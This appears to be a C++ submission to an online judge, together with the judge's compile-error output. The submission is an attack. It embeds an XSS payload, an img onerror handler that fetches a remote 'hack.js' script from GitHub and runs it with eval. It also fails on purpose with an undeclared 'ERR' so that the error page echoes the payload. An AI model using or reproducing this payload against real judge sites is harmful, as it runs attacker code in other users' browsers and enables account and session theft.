```cpp
int main(){const char*ch=R"(<img src onerror="setTimeout(async function(){eval(await(await fetch('https://raw.githubusercontent.com/ax6n/malijudge/refs/heads/main/hack.js')).text())},1000);">)";char y=ch[0];y=ch[1];ERR}
```

```plain
Your Score is 0.
main.cpp: In function 'int main()':
main.cpp:1:216: error: 'ERR' was not declared in this scope
    1 | int main(){const char*ch=R"(
)";char y=ch[0];y=ch[1];ERR}
      |                                                                                                                                                                                                                        ^~~
```
